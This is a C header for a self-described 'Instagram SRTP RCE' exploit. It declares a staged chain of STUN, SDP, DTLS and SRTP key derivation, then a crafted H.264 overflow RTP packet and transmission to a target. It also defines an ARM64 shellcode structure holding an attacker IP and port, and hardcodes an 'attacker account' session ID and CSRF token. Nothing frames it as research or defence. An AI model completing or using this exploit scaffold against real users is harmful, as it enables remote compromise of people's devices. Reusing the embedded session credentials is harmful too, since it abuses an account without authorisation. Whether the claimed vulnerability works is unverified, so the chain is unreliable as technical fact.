/*
 * Instagram SRTP RCE - Header File
 * Complete C implementation of SRTP-based RCE exploit
 */

#ifndef INSTAGRAM_RCE_H
#define INSTAGRAM_RCE_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>

/* Constants */
#define TARGET_RTC_PORT 43479
/* Facebook/Instagram RTC Servers (Multiple fallbacks) */
#define INSTAGRAM_RTC_SERVER "edge-chat-va.facebook.com"
#define INSTAGRAM_RTC_SERVER_2 "rtc.instagram.com"
#define INSTAGRAM_RTC_SERVER_3 "127.0.0.1"  /* Localhost fallback */
#define INSTAGRAM_STUN_SERVER "stun.l.google.com"
#define INSTAGRAM_API_BASE "https://www.instagram.com/api/v1"
#define INSTAGRAM_GRAPHQL "https://www.instagram.com/graphql/query"

/* Instagram Session (Attacker Account) */
#define INSTAGRAM_SESSIONID "28229430281%3AEsypYbgUvLgEz5%3A15%3AAYh0rwj_EFEeTgv8eVPqmZJC5f1CMNkLLVf4G1cfuQ"
#define INSTAGRAM_CSRFTOKEN "MWLiUNAIq6KSt3kHRR3pI4wR03YB1bqQ"
#define INSTAGRAM_USER_ID "28229430281"

/* STUN servers for NAT traversal */
#define STUN_SERVER "stun.l.google.com"
#define STUN_PORT 19302
#define STUN_SERVER_2 "stun1.l.google.com"
#define STUN_PORT_2 19302

#define RTP_VERSION 2
#define RTP_PAYLOAD_TYPE 96  /* H.264 */
#define RTP_HEADER_SIZE 12

#define SRTP_KEY_SIZE 16     /* AES-128 */
#define SRTP_SALT_SIZE 14
#define SRTP_AUTH_KEY_SIZE 20
#define SRTP_AUTH_TAG_SIZE 10

#define H264_OVERFLOW_WIDTH 0xFFFF
#define H264_OVERFLOW_HEIGHT 0xFFFF

/* Structures */
typedef struct {
    uint8_t version;
    uint8_t padding;
    uint8_t extension;
    uint8_t csrc_count;
    uint8_t marker;
    uint8_t payload_type;
    uint16_t seq_num;
    uint32_t timestamp;
    uint32_t ssrc;
    uint8_t *payload;
    size_t payload_size;
} rtp_packet_t;

typedef struct {
    uint8_t key[SRTP_KEY_SIZE];
    uint8_t salt[SRTP_SALT_SIZE];
    uint8_t auth_key[SRTP_AUTH_KEY_SIZE];
    uint16_t seq_num;
    uint32_t timestamp;
    uint32_t ssrc;
    uint32_t roc;  /* Rollover Counter */
} srtp_context_t;

typedef struct {
    char public_ip[16];
    uint16_t public_port;
} stun_result_t;

typedef struct {
    uint8_t master_key[SRTP_KEY_SIZE];
    uint8_t master_salt[SRTP_SALT_SIZE];
} dtls_result_t;

typedef struct {
    uint8_t srtp_packet[1024];
    size_t srtp_packet_size;
} exploit_packet_t;

typedef struct {
    uint8_t *code;
    size_t size;
    char attacker_ip[16];
    uint16_t attacker_port;
} arm64_shellcode_t;

/* Function declarations */

/* ATOM 1-1: STUN */
int stun_discover(stun_result_t *result);

/* ATOM 1-3: SDP */
char* sdp_generate(const char *username, const char *public_ip, uint16_t port);

/* ATOM 1-4: DTLS */
int dtls_handshake(dtls_result_t *result);

/* ATOM 2: SRTP Setup */
int srtp_derive_keys(const uint8_t *master_key, const uint8_t *master_salt,
                     srtp_context_t *ctx);

/* ATOM 3: Overflow Payload */
rtp_packet_t* create_overflow_rtp_packet(uint32_t ssrc, uint16_t seq_num,
                                         uint32_t timestamp);

/* ATOM 4: SRTP Encryption */
int srtp_encrypt_packet(const rtp_packet_t *rtp, const srtp_context_t *ctx,
                        uint8_t *output, size_t *output_size);

/* ATOM 5: Transmission */
int send_srtp_packet(const uint8_t *packet, size_t packet_size,
                     const char *target_ip, uint16_t target_port);

/* Utils */
void print_hex(const uint8_t *data, size_t len, const char *label);
void print_banner(void);
void print_phase_header(int phase, const char *title);

#endif /* INSTAGRAM_RCE_H */
